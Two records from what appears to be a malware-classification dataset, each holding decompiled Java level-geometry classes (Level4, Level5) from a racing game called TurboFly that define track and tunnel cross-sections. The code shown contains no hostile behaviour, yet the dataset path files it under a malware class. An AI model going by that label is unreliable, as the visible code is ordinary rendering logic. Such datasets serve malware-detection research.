"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.levels\Level4.code","public class Level4 extends SectionTypesBuilder {   public static SectionType piste1=null;   public static SectionType piste1Face=null;   public static SectionType piste1Vide=null;   public static SectionType piste1B=null;   public static SectionType piste1BVide=null;   public static SectionType piste2=null;   public static SectionType piste2Face=null;   public static SectionType piste2Vide=null;   public static SectionType piste2B=null;   public static SectionType piste2BVide=null;   public static SectionType piste3=null;   public static SectionType piste3Face=null;   public static SectionType piste3Vide=null;   public static SectionType piste3B=null;   public static SectionType piste3BVide=null;   public static SectionType piste4=null;   public static SectionType piste4Face=null;   public static SectionType piste4Vide=null;   public static SectionType piste4B=null;   public static SectionType piste4BVide=null;   public static SectionType tunnelMiddle=null;   public static SectionType tunnelMiddleB=null;   public static SectionType tunnelMiddle2=null;   public static SectionType tunnelMiddle2B=null;   public static SectionType tunnelDebut=null;   public static float[] blue={0.8235294f,0.8235294f,0.8235294f,0.0f};   public static float[] blue1={0.12156863f,0.16862746f,0.16078432f,1.0f};   public static float[] blue2={0.78431374f,0.78431374f,0.78431374f,0.0f};   public static void init(  int level){     if (level == 3) {       blue=blue1;     }  else {       blue=blue2;     }     piste1=getPiste1(5,10,22,19,2,3,14,15,8,9);     piste1Face=getPiste1Face(5,10,22,19,14,15,8,9,15,16,9,10);     piste1Vide=getPiste1Vide(2,3);     piste1B=getPiste1(5,10,22,19,5,6,14,15,8,9);     piste1BVide=getPiste1Vide(5,6);     piste2=getPiste1(8,8,19,22,2,3,8,9,8,9);     piste2Face=getPiste1Face(8,8,19,22,8,9,8,9,9,10,9,10);     piste2Vide=getPiste1Vide(2,3);     piste2B=getPiste1(8,8,19,22,5,6,8,9,8,9);     piste2BVide=getPiste1Vide(5,6);     piste3=getPiste1(10,5,20,20,2,3,8,9,14,15);     piste3Face=getPiste1Face(10,5,20,20,8,9,14,15,9,10,15,16);     piste3Vide=getPiste1Vide(2,3);     piste3B=getPiste1(10,5,20,20,5,6,8,9,14,15);     piste3BVide=getPiste1Vide(5,6);     piste4=getPiste1(9,6,26,19,2,3,14,15,14,15);     piste4Face=getPiste1Face(9,6,26,19,14,15,14,15,15,16,15,16);     piste4Vide=getPiste1Vide(2,3);     piste4B=getPiste1(9,6,26,19,5,6,14,15,14,15);     piste4BVide=getPiste1Vide(5,6);     tunnelMiddle=getTunnel(2,3);     tunnelMiddleB=getTunnel(5,6);     tunnelDebut=getTunnelDebut(2,3);     tunnelMiddle2=getTunnel2(2,3);     tunnelMiddle2B=getTunnel2(5,6);   }   private static SectionType getPiste1(  int dxf,  int dxbf,  int dyf,  int dybf,  int txr1,  int txr2,  int txa1,  int txa2,  int txb1,  int txb2){     double[] coordsX={0.0d,2.0d,3.0d,3.0d,3.5d,3.5d,3.8d,3.8d,0.0d,dxf,-dxbf,0.0d,-3.8d,-3.8d,-3.5d,-3.5d,-3.0d,-3.0d,-2.0d,0.0d,dxf,dxf,-dxbf,-dxbf};     double[] coordsY={0.0d,0.0d,-0.1d,-0.1d,-0.8d,-0.8d,-0.6d,1.2d,1.2d,1.2d,1.2d,1.2d,1.2d,-0.6d,-0.8d,-0.8d,-0.1d,-0.1d,0.0d,0.0d,1.2d,-dyf,-dybf,1.2d};     int[] typeY=new int[24];     typeY[8]=1;     typeY[9]=1;     typeY[10]=1;     typeY[11]=1;     typeY[20]=1;     typeY[21]=1;     typeY[22]=1;     typeY[23]=1;     int[] texX={0,1,2,txr1,txr2,3,4,5,8,9,9,8,5,4,3,txr2,txr1,2,1,0,txa1,txa2,txb2,txb1};     int[] finSeg=new int[24];     finSeg[2]=1;     finSeg[4]=1;     finSeg[7]=1;     finSeg[9]=1;     finSeg[11]=1;     finSeg[14]=1;     finSeg[16]=1;     finSeg[19]=1;     finSeg[21]=1;     finSeg[23]=1;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,typeY,texX,texY,finSeg,fogColor);   }   private static SectionType getPiste1Vide(  int txr1,  int txr2){     double[] coordsX={0.0d,2.0d,3.0d,3.0d,3.5d,3.5d,3.8d,3.8d,0.0d,12.0d,-12.0d,0.0d,-3.8d,-3.8d,-3.5d,-3.5d,-3.0d,-3.0d,-2.0d,0.0d};     double[] coordsY={0.0d,0.0d,-0.1d,-0.1d,-0.8d,-0.8d,-0.6d,1.2d,1.2d,1.2d,1.2d,1.2d,1.2d,-0.6d,-0.8d,-0.8d,-0.1d,-0.1d,0.0d,0.0d};     int[] typeY=new int[20];     typeY[8]=1;     typeY[9]=1;     typeY[10]=1;     typeY[11]=1;     int[] texX={0,1,2,txr1,txr2,3,4,5,8,9,9,8,5,4,3,txr2,txr1,2,1};     int[] finSeg=new int[20];     finSeg[2]=1;     finSeg[4]=1;     finSeg[7]=1;     finSeg[9]=1;     finSeg[11]=1;     finSeg[14]=1;     finSeg[16]=1;     finSeg[19]=1;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,typeY,texX,texY,finSeg,fogColor);   }   private static SectionType getPiste1Face(  int dxf,  int dxbf,  int dyf,  int dybf,  int txa1,  int txa2,  int txb1,  int txb2,  int txf1,  int txf2,  int txfb1,  int txfb2){     double[] coordsX={0.0d,2.0d,3.0d,3.0d,3.5d,3.5d,3.8d,3.8d,0.0d,dxf,-dxbf,0.0d,-3.8d,-3.8d,-3.5d,-3.5d,-3.0d,-3.0d,-2.0d,0.0d,dxf,dxf,-dxbf,-dxbf,dxf,dxf,18.0d,18.0d,-18.0d,-18.0d,-dxbf,-dxbf};     double[] coordsY={0.0d,0.0d,-0.1d,-0.1d,-0.8d,-0.8d,-0.6d,1.2d,1.2d,1.2d,1.2d,1.2d,1.2d,-0.6d,-0.8d,-0.8d,-0.1d,-0.1d,0.0d,0.0d,1.2d,-dyf,-dybf,1.2d,1.2d,-dyf,1.2d,-dyf,1.2d,-dybf,1.2d,-dybf};     int[] typeY={0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1};     int[] texX={0,1,2,2,3,3,4,5,8,9,9,8,5,4,3,3,2,2,1,0,txa1,txa2,txb2,txb1,txf1,txf1,txf2,txf2,txfb1,txfb1,txfb2,txfb2};     int[] finSeg={0,0,1,0,1,0,0,1,0,1,0,1,0,0,1,0,1,0,0,1,0,1,0,1,2,3,2,3};     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,typeY,texX,texY,finSeg,fogColor);   }   public static SectionType getTunnel(  int txr1,  int txr2){     double[] coordsX={0.0d,2.0d,3.0d,3.0d,3.5d,3.5d,3.5d,2.5d,1.5d,1.5d,0.0d,0.0d,-1.5d,-1.5d,-2.5d,-3.5d,-3.5d,-3.5d,-3.0d,-3.0d,-2.0d,0.0d};     double[] coordsY={0.0d,0.0d,-0.1d,-0.1d,-0.8d,-0.8d,-2.2d,-2.8d,-3.1d,-3.1d,-3.3d,-3.3d,-3.1d,-3.1d,-2.8d,-2.2d,-0.8d,-0.8d,-0.1d,-0.1d,0.0d,0.0d};     int[] typeY=new int[22];     int[] texX={0,1,2,txr1,txr2,7,6,7,6,7,6,6,7,6,7,6,7,txr2,txr1,2,1};     int[] finSeg=new int[22];     finSeg[2]=1;     finSeg[4]=1;     finSeg[8]=1;     finSeg[10]=1;     finSeg[12]=1;     finSeg[16]=1;     finSeg[18]=1;     finSeg[21]=1;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,typeY,texX,texY,finSeg,fogColor);   }   public static SectionType getTunnel2(  int txr1,  int txr2){     double[] coordsX={0.0d,2.0d,3.0d,3.0d,3.5d,3.5d,3.5d,1.0d,1.0d,1.0d,0.0d,0.0d,-1.0d,-1.0d,-1.0d,-3.5d,-3.5d,-3.5d,-3.0d,-3.0d,-2.0d,0.0d};     double[] coordsY={0.0d,0.0d,-0.1d,-0.1d,-0.8d,-0.8d,-2.8d,-2.8d,-2.4d,-2.4d,-2.4d,-2.4d,-2.4d,-2.4d,-2.8d,-2.8d,-0.8d,-0.8d,-0.1d,-0.1d,0.0d,0.0d};     int[] typeY=new int[22];     int[] texX={0,1,2,txr1,txr2,6,5,4,3,13,14,14,13,3,4,5,6,txr2,txr1,2,1};     int[] finSeg=new int[22];     finSeg[2]=1;     finSeg[4]=1;     finSeg[8]=1;     finSeg[10]=1;     finSeg[12]=1;     finSeg[16]=1;     finSeg[18]=1;     finSeg[21]=1;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f};     float[] fogColor=blue1;     return buildST(coordsX,coordsY,typeY,texX,texY,finSeg,fogColor);   }   public static SectionType getTunnelDebut(  int txr1,  int txr2){     double[] coordsX={0.0d,2.0d,3.0d,3.0d,3.5d,3.5d,3.5d,3.5d,2.5d,2.5d,0.0d,0.0d,-2.5d,-2.5d,-3.5d,-3.5d,-3.5d,-3.5d,-3.0d,-3.0d,-2.0d,0.0d,-12.5d,-12.5d,-3.5d,-3.5d,3.5d,3.5d,12.5d,12.5d,-3.5d,-3.5d,3.5d,3.5d};     double[] coordsY={0.0d,0.0d,-0.1d,-0.1d,-0.8d,-0.8d,-1.6d,-2.2d,-2.2d,-2.2d,-2.2d,-2.2d,-2.2d,-2.2d,-2.2d,-1.6d,-0.8d,-0.8d,-0.1d,-0.1d,0.0d,0.0d,-0.0d,-5.2d,-0.0d,-5.2d,-0.0d,-5.2d,-0.0d,-5.2d,-2.2d,-5.2d,-2.2d,-5.2d};     int[] typeY=new int[34];     typeY[22]=1;     typeY[24]=1;     typeY[26]=1;     typeY[28]=1;     int[] texX={0,1,2,txr1,txr2,5,6,7,6,7,6,6,7,6,7,6,5,txr2,txr1,2,1,0,9,9,10,10,9,9,10,10,10,10,12,12};     int[] finSeg={0,0,1,0,1,0,0,0,1,0,1,0,1,0,0,0,1,0,1,0,0,1,2,3,2,3,2,3};     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,1.0f,0.0f,1.0f,0.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,typeY,texX,texY,finSeg,fogColor);   } } "
"msc_data/decompiled_malware_class/00005BE947A8F108382B59CED7D1E95871A68539C00FF53FD3E1D93C58E2BA6C\net.osaris.turbofly.levels\Level5.code","public class Level5 extends SectionTypesBuilder {   public static SectionType l5piste1=null;   public static SectionType l5piste1A=null;   public static SectionType l5piste1A2=null;   public static SectionType l5piste2=null;   public static SectionType l5piste2M=null;   public static SectionType l5tunnelMiddle1=null;   public static SectionType l5tunnelMiddle2=null;   public static SectionType l5tunnelDebut=null;   public static SectionType l5piste3=null;   public static SectionType l5piste3Debut=null;   public static SectionType l5piste4=null;   public static SectionType l5piste4Debut=null;   public static float[] blue1={0.5f,0.5f,0.5f,1.0f};   public static float[] blue2={0.6392157f,0.5058824f,0.9098039f,1.0f};   public static float[] blue={0.78431374f,0.5411765f,0.3019608f,1.0f};   public static float[] blueDesert={0.78431374f,0.5411765f,0.3019608f,1.0f};   public static float[] blueSnow={1.0f,1.0f,1.0f,1.0f};   public static float[] black={0.0f,0.0f,0.0f,1.0f};   public static float[] blackDesert={0.0f,0.0f,0.0f,1.0f};   public static float[] blackSnow={1.0f,1.0f,1.0f,1.0f};   public static void init(){     l5piste1=getl5Piste1();     l5piste1A=getl5Piste1A();     l5piste1A2=getl5Piste1A2();     l5piste2=getl5Piste2();     l5piste2M=getl5Piste2M();     l5tunnelMiddle1=getTunelMiddle1();     l5tunnelMiddle2=getTunelMiddle2();     l5tunnelDebut=getDebutTunnel();     l5piste3=getl5Piste3();     l5piste3Debut=getl5Piste3Debut();     l5piste4=getl5Piste4();     l5piste4Debut=getl5Piste4Debut();   }   private static SectionType getTunelMiddle1(){     double[] coordsX={0.0d,2.5d,3.0d,3.0d,3.5d,3.9d,3.9d,3.7d,2.5d,2.5d,1.5d,0.0d,-1.5d,-2.5d,-2.5d,-3.7d,-3.9d,-3.9d,-3.5d,-3.0d,-3.0d,-2.5d,0.0d};     double[] coordsY={0.0d,0.0d,0.0d,-0.0d,-0.6d,-0.6d,-0.6d,-2.3d,-3.8d,-3.8d,-4.2d,-4.3d,-4.2d,-3.8d,-3.8d,-2.3d,-0.6d,-0.6d,-0.6d,-0.0d,0.0d,0.0d,0.0d};     int[] texX={0,1,2,2,3,4,6,7,6,7,6,7,6,7,6,7,6,4,3,2,2,1};     int[] finSeg=new int[23];     finSeg[2]=1;     finSeg[5]=1;     finSeg[8]=1;     finSeg[13]=1;     finSeg[16]=1;     finSeg[19]=1;     finSeg[22]=1;     float[] texY=new float[texX.length];     for (int i=0; i < texY.length; i++) {       texY[i]=1.0f;     }     float[] fogColor=black;     SectionType result=buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);     result.diffuse=SectionType.black;     result.specular=SectionType.black;     return result;   }   private static SectionType getTunelMiddle2(){     double[] coordsX={0.0d,2.5d,3.0d,3.0d,3.5d,3.9d,3.9d,3.7d,2.5d,2.5d,1.5d,0.0d,-1.5d,-2.5d,-2.5d,-3.7d,-3.9d,-3.9d,-3.5d,-3.0d,-3.0d,-2.5d,0.0d};     double[] coordsY={0.0d,0.0d,0.0d,-0.0d,-0.6d,-0.6d,-0.6d,-2.3d,-3.8d,-3.8d,-4.2d,-4.3d,-4.2d,-3.8d,-3.8d,-2.3d,-0.6d,-0.6d,-0.6d,-0.0d,0.0d,0.0d,0.0d};     int[] texX={0,1,2,2,3,4,7,8,7,8,7,8,7,8,7,8,7,4,3,2,2,1};     int[] finSeg=new int[23];     finSeg[2]=1;     finSeg[5]=1;     finSeg[8]=1;     finSeg[13]=1;     finSeg[16]=1;     finSeg[19]=1;     finSeg[22]=1;     float[] texY=new float[texX.length];     for (int i=0; i < texY.length; i++) {       texY[i]=1.0f;     }     float[] fogColor=black;     SectionType result=buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);     result.diffuse=SectionType.black;     result.specular=SectionType.black;     result.ambient=SectionType.whiteambient;     return result;   }   private static SectionType getDebutTunnel(){     double[] coordsX={0.0d,2.5d,3.0d,3.5d,3.9d,3.9d,3.7d,2.5d,2.5d,1.5d,0.0d,-1.5d,-2.5d,-2.5d,-3.7d,-3.9d,-3.9d,-3.5d,-3.0d,-2.5d,0.0d,-10.0d,-7.0d,10.0d,7.0d,-20.0d,-20.0d,-4.2d,-2.0d,4.2d,2.0d,20.0d,20.0d};     double[] coordsY={0.0d,0.0d,-0.0d,-0.6d,-0.6d,-0.6d,-2.3d,-3.8d,-3.8d,-4.2d,-4.3d,-4.2d,-3.8d,-3.8d,-2.3d,-0.6d,-0.6d,-0.6d,-0.0d,0.0d,0.0d,-3.8d,-6.5d,-3.8d,-6.5d,-3.0d,-6.0d,-0.0d,-3.9d,-0.0d,-3.9d,-3.0d,-6.0d};     int[] texX={0,1,2,3,4,7,6,7,6,7,6,7,6,7,6,7,4,3,2,1,0,6,6,5,5,6,6,5,5,6,6,5,5};     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f};     int[] finSeg=new int[27];     finSeg[4]=1;     finSeg[7]=1;     finSeg[12]=1;     finSeg[15]=1;     finSeg[20]=1;     finSeg[21]=2;     finSeg[22]=3;     finSeg[23]=2;     finSeg[24]=3;     finSeg[25]=2;     finSeg[26]=3;     float[] fogColor=black;     SectionType result=buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);     result.diffuse=SectionType.black;     result.specular=SectionType.black;     return result;   }   private static SectionType getl5Piste1(){     double[] coordsX={0.0d,2.5d,3.0d,3.5d,3.9d,3.9d,5.0d,12.0d,16.0d,20.0d,20.0d,20.0d,-20.0d,-20.0d,-20.0d,-16.0d,-12.0d,-5.0d,-3.9d,-3.9d,-3.5d,-3.0d,-2.5d,0.0d};     double[] coordsY={0.0d,0.0d,0.0d,-0.6d,-0.6d,-0.5d,-0.5d,-1.5d,-3.0d,-3.5d,-3.5d,-6.5d,-6.5d,-3.5d,-3.5d,-3.0d,-1.5d,-0.5d,-0.5d,-0.6d,-0.6d,0.0d,0.0d,0.0d};     int[] texX={0,1,2,3,4,5,6,5,4,5,15,16,16,15,5,4,5,6,5,4,3,2,1};     int[] finSeg=new int[24];     finSeg[9]=1;     finSeg[11]=1;     finSeg[13]=1;     finSeg[23]=1;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   }   private static SectionType getl5Piste1A(){     double[] coordsX={0.0d,2.5d,3.0d,3.5d,3.9d,3.9d,5.0d,12.0d,16.0d,20.0d,20.0d,20.0d,-20.0d,-20.0d,-20.0d,-16.0d,-12.0d,-5.0d,-3.9d,-3.9d,-3.5d,-3.0d,-2.5d,0.0d,12.5d,12.5d,16.0d,16.0d,4.5d,4.5d,6.0d,6.0d,-12.0d,-12.0d,-9.0d,-9.0d,-8.0d,-8.0d,-6.0d,-6.0d};     double[] coordsY={0.0d,0.0d,0.0d,-0.6d,-0.6d,-0.5d,-0.5d,-1.5d,-3.0d,-3.5d,-3.5d,-6.5d,-6.5d,-3.5d,-3.5d,-3.0d,-1.5d,-0.5d,-0.5d,-0.6d,-0.6d,0.0d,0.0d,0.0d,-2.5d,-7.0d,-2.5d,-7.0d,-0.5d,-2.0d,-0.5d,-2.0d,-1.0d,-6.0d,-1.0d,-6.0d,-0.5d,-3.0d,-0.5d,-3.0d};     int[] texX={0,1,2,3,4,5,6,5,4,5,15,16,16,15,5,4,5,6,5,4,3,2,1,0,14,14,15,15,10,10,9,9,14,14,15,15,9,9,8,8};     int[] finSeg=new int[32];     finSeg[9]=1;     finSeg[11]=1;     finSeg[13]=1;     finSeg[23]=1;     finSeg[24]=2;     finSeg[25]=3;     finSeg[26]=2;     finSeg[27]=3;     finSeg[28]=2;     finSeg[29]=3;     finSeg[30]=2;     finSeg[31]=3;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   }   private static SectionType getl5Piste1A2(){     double[] coordsX={0.0d,2.5d,3.0d,3.5d,3.9d,3.9d,5.0d,12.0d,16.0d,20.0d,20.0d,20.0d,-20.0d,-20.0d,-20.0d,-16.0d,-12.0d,-5.0d,-3.9d,-3.9d,-3.5d,-3.0d,-2.5d,0.0d,-16.5d,-16.5d,-13.5d,-13.5d,-6.0d,-6.0d,-5.0d,-5.0d,9.5d,9.5d,11.0d,11.0d,5.0d,5.0d,7.5d,7.5d};     double[] coordsY={0.0d,0.0d,0.0d,-0.6d,-0.6d,-0.5d,-0.5d,-1.5d,-3.0d,-3.5d,-3.5d,-6.5d,-6.5d,-3.5d,-3.5d,-3.0d,-1.5d,-0.5d,-0.5d,-0.6d,-0.6d,0.0d,0.0d,0.0d,-2.5d,-6.0d,-2.5d,-6.0d,-0.5d,-2.0d,-0.5d,-2.0d,-1.0d,-3.5d,-1.0d,-3.5d,-0.5d,-4.0d,-0.5d,-4.0d};     int[] texX={0,1,2,3,4,5,6,5,4,5,15,16,16,15,5,4,5,6,5,4,3,2,1,0,8,8,9,9,9,9,10,10,8,8,9,9,8,8,9,9};     int[] finSeg=new int[32];     finSeg[9]=1;     finSeg[11]=1;     finSeg[13]=1;     finSeg[23]=1;     finSeg[24]=2;     finSeg[25]=3;     finSeg[26]=2;     finSeg[27]=3;     finSeg[28]=2;     finSeg[29]=3;     finSeg[30]=2;     finSeg[31]=3;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   }   private static SectionType getl5Piste2(){     double[] coordsX={0.0d,2.5d,3.0d,3.5d,3.9d,3.9d,5.0d,5.5d,5.0d,5.5d,-4.5d,-4.0d,-4.5d,-4.0d,-3.9d,-3.9d,-3.5d,-3.0d,-2.5d,0.0d};     double[] coordsY={0.0d,0.0d,0.0d,-0.6d,-0.6d,-0.5d,-0.5d,-6.5d,-9.0d,-10.0d,-11.0d,-10.0d,-5.5d,-0.5d,-0.5d,-0.6d,-0.6d,0.0d,0.0d,0.0d};     int[] texX={0,1,2,3,4,5,6,5,6,5,5,6,5,6,5,4,3,2,1};     int[] finSeg=new int[20];     finSeg[9]=1;     finSeg[19]=1;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   }   private static SectionType getl5Piste2M(){     double[] coordsX={0.0d,2.5d,3.0d,3.5d,3.9d,3.9d,5.0d,5.5d,5.0d,5.5d,-4.5d,-4.0d,-4.5d,-4.0d,-3.9d,-3.9d,-3.5d,-3.0d,-2.5d,0.0d};     double[] coordsY={0.0d,0.0d,0.0d,-0.6d,-0.6d,-0.5d,-0.5d,-6.5d,-9.0d,-10.0d,-11.0d,-10.0d,-5.5d,-0.5d,-0.5d,-0.6d,-0.6d,0.0d,0.0d,0.0d};     int[] texX={0,1,2,3,4,5,4,5,4,5,5,4,5,4,5,4,3,2,1};     int[] finSeg=new int[20];     finSeg[9]=1;     finSeg[19]=1;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   }   private static SectionType getl5Piste3(){     double[] coordsX={0.0d,2.5d,3.0d,3.5d,3.9d,3.9d,5.0d,12.0d,16.0d,20.0d,20.0d,20.0d,-10.0d,-7.0d,-5.0d,-5.0d,-3.9d,-3.9d,-3.5d,-3.0d,-2.5d,0.0d};     double[] coordsY={0.0d,0.0d,0.0d,-0.6d,-0.6d,-0.5d,-0.5d,-1.5d,-3.0d,-3.5d,-3.5d,-6.5d,-4.5d,-4.5d,-0.5d,-0.5d,-0.5d,-0.6d,-0.6d,0.0d,0.0d,0.0d};     int[] texX={0,1,2,3,4,5,6,5,4,5,15,16,4,3,2,4,5,4,3,2,1};     int[] finSeg=new int[22];     finSeg[9]=1;     finSeg[11]=1;     finSeg[14]=1;     finSeg[21]=1;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   }   private static SectionType getl5Piste3Debut(){     double[] coordsX={0.0d,2.5d,3.0d,3.5d,3.9d,3.9d,5.0d,12.0d,16.0d,20.0d,20.0d,20.0d,-12.0d,-6.0d,-4.0d,-4.5d,-3.9d,-3.9d,-3.5d,-3.0d,-2.5d,0.0d,-20.0d,-20.0d,-4.0d,-6.0d,9.5d,9.5d,11.0d,11.0d,5.0d,5.0d,7.5d,7.5d};     double[] coordsY={0.0d,0.0d,0.0d,-0.6d,-0.6d,-0.5d,-0.5d,-1.5d,-3.0d,-3.5d,-3.5d,-6.5d,-5.0d,-5.0d,-0.0d,-0.5d,-0.5d,-0.6d,-0.6d,0.0d,0.0d,0.0d,-2.0d,-5.0d,-0.0d,-5.0d,-1.0d,-3.5d,-1.0d,-3.5d,-0.5d,-4.0d,-0.5d,-4.0d};     int[] texX={0,1,2,3,4,5,6,5,4,5,15,16,14,13,12,6,5,4,3,2,1,0,13,13,14,14,8,8,9,9,8,8,9,9};     int[] finSeg=new int[28];     finSeg[9]=1;     finSeg[11]=1;     finSeg[14]=1;     finSeg[21]=1;     finSeg[22]=2;     finSeg[23]=3;     finSeg[24]=2;     finSeg[25]=3;     finSeg[26]=2;     finSeg[27]=3;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   }   private static SectionType getl5Piste4(){     double[] coordsX={0.0d,2.5d,3.0d,3.5d,3.9d,3.9d,5.0d,5.0d,7.0d,10.0d,-20.0d,-20.0d,-20.0d,-16.0d,-12.0d,-5.0d,-3.9d,-3.9d,-3.5d,-3.0d,-2.5d,0.0d};     double[] coordsY={0.0d,0.0d,0.0d,-0.6d,-0.6d,-0.5d,-0.5d,-0.5d,-4.5d,-4.5d,-6.5d,-3.5d,-3.5d,-3.0d,-1.5d,-0.5d,-0.5d,-0.6d,-0.6d,0.0d,0.0d,0.0d};     int[] texX={0,1,2,3,4,5,4,2,3,4,16,15,5,4,5,6,5,4,3,2,1};     int[] finSeg=new int[22];     finSeg[6]=1;     finSeg[9]=1;     finSeg[11]=1;     finSeg[21]=1;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   }   private static SectionType getl5Piste4Debut(){     double[] coordsX={0.0d,2.5d,3.0d,3.5d,3.9d,3.9d,4.5d,4.0d,6.0d,12.0d,-20.0d,-20.0d,-20.0d,-16.0d,-12.0d,-5.0d,-3.9d,-3.9d,-3.5d,-3.0d,-2.5d,0.0d,4.0d,6.0d,20.0d,20.0d,-16.5d,-16.5d,-13.5d,-13.5d,-6.0d,-6.0d,-5.0d,-5.0d};     double[] coordsY={0.0d,0.0d,0.0d,-0.6d,-0.6d,-0.5d,-0.5d,-0.0d,-5.0d,-5.0d,-6.5d,-3.5d,-3.5d,-3.0d,-1.5d,-0.5d,-0.5d,-0.6d,-0.6d,0.0d,0.0d,0.0d,-0.0d,-5.0d,-2.0d,-5.0d,-2.5d,-6.0d,-2.5d,-6.0d,-0.5d,-2.0d,-0.5d,-2.0d};     int[] texX={0,1,2,3,4,5,6,12,13,14,16,15,5,4,5,6,5,4,3,2,1,0,13,13,14,14,8,8,9,9,9,9,10,10};     int[] finSeg=new int[28];     finSeg[6]=1;     finSeg[9]=1;     finSeg[11]=1;     finSeg[21]=1;     finSeg[22]=2;     finSeg[23]=3;     finSeg[24]=2;     finSeg[25]=3;     finSeg[26]=2;     finSeg[27]=3;     float[] texY={1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f,1.0f,0.0f};     float[] fogColor=blue;     return buildST(coordsX,coordsY,texX,texY,finSeg,fogColor);   } } "
